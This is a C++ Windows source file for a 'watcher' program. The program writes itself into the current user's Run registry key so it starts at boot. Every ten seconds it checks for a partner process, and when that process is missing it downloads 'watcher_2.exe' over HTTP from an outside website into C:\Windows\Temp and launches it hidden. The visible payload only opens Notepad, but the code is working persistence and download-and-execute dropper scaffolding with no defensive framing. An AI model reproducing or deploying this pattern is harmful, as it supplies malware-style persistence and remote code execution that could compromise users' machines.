#include <windows.h>
#include <tchar.h>
#include <cstdio>
#include <winhttp.h>
#include <string>
#include <fstream>
#include <psapi.h>
/*
Adds itself to the windows registry to run on startup
Starts another program, based on its name and location found in the registry.
This means the watcher and the other program can be found in different places.
*/
bool IsProcessRunning(const std::wstring& processName);

int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath);
void openNotepad();
BOOL CALLBACK EnumWindowsNotepad(HWND hwnd, LPARAM lParam);

int _tmain(int argc, _TCHAR* argv[]) {
    // adds itself to registry
    HKEY hKey;
    const TCHAR* subkey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        _tprintf(_T("Could not open registry key.\n"));
        return 1;
    }

    const TCHAR* valueName = _T("Watcher_1");

    // gets the current path of the program
    TCHAR pathToExe[MAX_PATH];
    if (!GetModuleFileName(NULL, pathToExe, MAX_PATH))
    {
        return 1;
    }

    if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (LPBYTE)pathToExe, (_tcslen(pathToExe) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
        _tprintf(_T("Could not set registry value.\n"));
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);
     _tprintf(_T("Set registry value.\n"));

    // continually checks if the second program exists. If it does not exist, starts it. if it can't start it, downloads it.
    while (true) {
        if (IsProcessRunning(L"watcher_2.exe")) {    
            openNotepad();
             _tprintf(_T("Opened notepad\n"));
        } else {
            std::string pathToProgram = "C:\\Windows\\Temp\\watcher_2.exe";
            std::wstring pathToProgramW = L"C:\\Windows\\Temp\\watcher_2.exe";
            // downloads the second program if it is not in the registry
            downloadProgram(L"www.andrewbernal.com", L"/watcher_2.exe", pathToProgram);
            // The path to the downloaded program
             _tprintf(_T("Downloaded program\n"));
            // Start the program
            HINSTANCE hInstance = ShellExecuteW(
                NULL,
                L"open",
                pathToProgramW.c_str(),
                NULL,
                NULL,
                SW_HIDE
            );

            // Check for errors
            if (reinterpret_cast<LONG_PTR>(hInstance) <= 32) {
                // Handle error
            }
        }
        Sleep(10000); // Sleep for 10 seconds
    }  
  return 0;
}

int downloadProgram(LPCWSTR websitePath, LPCWSTR filePathOnWebsite, std::string storagePath) {
    HINTERNET hSession = WinHttpOpen(
        L"My User Agent/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession)
        return 1;

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        websitePath,
        INTERNET_DEFAULT_HTTP_PORT,
        0
    );
    if (!hConnect)
        return 2;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, 
        L"GET", 
        filePathOnWebsite, 
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );
    if (!hRequest)
        return 3;

    BOOL bResults = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    std::ofstream file(storagePath, std::ios::binary);

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    do
    {
        dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        BYTE *buf = new BYTE[dwSize];
        WinHttpReadData(hRequest, buf, dwSize, &dwDownloaded);
        file.write(reinterpret_cast<const char *>(buf), dwDownloaded);
        delete[] buf;
    } while (dwSize > 0);

    file.close();

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}

bool IsProcessRunning(const std::wstring& processName) {
    DWORD aProcesses[1024], cbNeeded;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        return false;
    }
    DWORD cProcesses = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            HANDLE hProcess = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE,
                aProcesses[i]
            );
            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    wchar_t szProcessName[MAX_PATH];
                    GetModuleBaseNameW(
                        hProcess,
                        hMod,
                        szProcessName,
                        sizeof(szProcessName) / sizeof(wchar_t)
                    );
                    if (processName == szProcessName) {
                        CloseHandle(hProcess);
                        return true;
                    }
                }
            }
            CloseHandle(hProcess);
        }
    }
    return false;
}

void openNotepad() {
   if (!IsProcessRunning(L"notepad.exe")) {
        std::wstring filename = L"temp.txt";
        
        // Convert wstring to string for ofstream
        std::string filenameStr(filename.begin(), filename.end());
        
        std::ofstream file(filenameStr);
        if (file.is_open()) {
            file << "Hello!";
            file.close();
        }
        
        ShellExecuteW(NULL, L"open", L"notepad.exe", filename.c_str(), NULL, SW_SHOW);
    }
}


